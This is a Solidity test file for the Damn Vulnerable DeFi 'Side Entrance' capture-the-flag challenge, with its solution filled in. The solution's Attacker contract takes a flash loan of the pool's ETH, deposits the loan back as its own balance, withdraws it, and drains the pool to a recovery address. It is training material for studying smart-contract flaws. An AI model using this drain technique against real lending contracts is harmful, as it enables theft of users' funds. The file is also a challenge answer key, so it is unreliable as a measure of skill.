// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        pool.flashLoan(ETHER_IN_POOL);
    }
    
    /**
    * USED FOR TESTING INITIAL STATE - DO NOT TOUCH
    */
    function execute() external payable {
        (address(pool)).call{value: msg.value}("");
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        (new Attacker()).attack(pool, recovery, ETHER_IN_POOL);
    }


    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}

contract Attacker {
    function attack(SideEntranceLenderPool _pool, address _recovery, uint256 _amount) external {
        // Attacker can deploy the contract and call the execute function
        // to deposit the flash loaned ETH into the pool.
        _pool.flashLoan( _amount);
        _pool.withdraw();
        payable(_recovery).transfer(_amount);
    }

    function execute() external payable {
        // This function is called by the pool during the flash loan.
        // It deposits the flash loaned ETH into the pool.
        SideEntranceLenderPool(payable(msg.sender)).deposit{value: msg.value}();
    }

    receive() external payable {
    }
}